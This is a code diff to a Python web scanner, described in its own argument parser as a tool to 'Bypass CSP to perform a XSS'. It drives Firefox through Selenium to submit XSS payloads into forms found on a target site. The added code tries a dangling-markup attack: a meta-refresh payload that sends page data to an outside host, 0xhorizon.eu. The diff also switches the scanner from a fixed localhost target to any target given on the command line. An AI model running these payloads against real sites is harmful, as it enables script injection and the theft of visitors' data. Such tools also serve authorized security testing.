@@ -152,7 +152,7 @@ class Form:
 
     def test_dom(self):
         parameters = {}
-        value = "random_value_t0_test"
+        value = "<em>random_value_t0_test</em>"
         for name in self.names:
             parameters[name] = value
         if self.method.lower() == "get":
@@ -165,7 +165,7 @@ class Form:
         else:
             return False
 
-    def exploit(self, payload):
+    def exploit(self, payload, dangling=False):
         wb = webdriver.Firefox()
         wb.get(self.url)
         for name in self.names:
@@ -176,13 +176,22 @@ class Form:
         form.submit()
         time.sleep(0.5)
 
-        try:
-            wb.find_element_by_id("testing_js_exploit_param")
-            wb.close()
-            return True
-        except selenium.common.exceptions.NoSuchElementException:
-            wb.close()
-            return False
+        if dangling:
+            if urlparse(wb.current_url).netloc != urlparse(self.url).netloc:
+                wb.close()
+                return True
+            else:
+                wb.close()
+                return False
+        else:
+            try:
+                wb.find_element_by_id("testing_js_exploit_param")
+                wb.close()
+                return True
+            except selenium.common.exceptions.NoSuchElementException:
+                wb.close()
+                return False
+
 
 def parse_args():
     parser = argparse.ArgumentParser(add_help=True, description='Bypass CSP to perform a XSS')
@@ -200,9 +209,9 @@ def parse_args():
     return args
 
 if __name__ == '__main__':
-    #args = parse_args()
-    #scan = Scanner(target=args.target, no_colors=args.no_colors, dynamic=args.dynamic, all_pages=args.all_pages)
-    scan = Scanner("http://localhost/1/", all_pages=False, dynamic=True)
+    args = parse_args()
+    scan = Scanner(target=args.target, no_colors=args.no_colors, dynamic=args.dynamic, all_pages=args.all_pages)
+    #scan = Scanner("http://localhost/1/", all_pages=False, dynamic=True)
 
     scan.info(f"Starting scan on target {scan.target}\n")
     
@@ -223,7 +232,7 @@ if __name__ == '__main__':
                 new_form = Form(page.url, urljoin(page.url, action), method, [input.attrs["name"] for input in inputs])
 
                 if new_form.test_dom():
-                    scan.info("Parameter reflected in DOM")
+                    scan.info("Parameter reflected in DOM and no htmlspecialchars detected")
                     if page.csp != []:
                         if page.scan():
                             scan.vuln(f"Potential vulnerability found {page.vuln}")
@@ -236,7 +245,7 @@ if __name__ == '__main__':
                                     payload = page.payload
                                 else:
                                     scan.fail("Potential exploit failed")
-                                    scan.info("Trying constructing payload...")
+                                    scan.info("Trying payload construction...")
                                     payloads_constructed = construct_payloads(page.payload, page.jsonp)
                                     for payload_generated in payloads_constructed:
                                         if new_form.exploit(payload_generated):
@@ -247,9 +256,17 @@ if __name__ == '__main__':
                                     scan.succeed(f"Payload found on {page.url}")
                                     scan.succeed(f"Payload: {payload}\n")
                                 else:
-                                    scan.fail("No exploit found\n")
+                                    scan.fail("No XSS found\n")
+                            else:
+                                scan.info("Use -d/--dynamic flag to use the dynamic scan")
                         else:
-                            scan.fail(f"No exploit found\n")
+                            scan.fail(f"No XSS found\n")
+                            scan.info("Perhaps you can exploit Dangling Markup")
+                            if scan.dynamic:
+                                scan.info("Trying exploiting Dangling Markup...")
+                                dangling_markup_payload = "<meta http-equiv=\"refresh\" content='0; url=https://0xhorizon.eu?data="
+                                if new_form.exploit(dangling_markup_payload, True):
+                                    scan.succeed(f"Dangling markup payload found: {dangling_markup_payload}\n")
                     else:
                         scan.fail(f"No CSP on page {page.url}\n")
                 else:
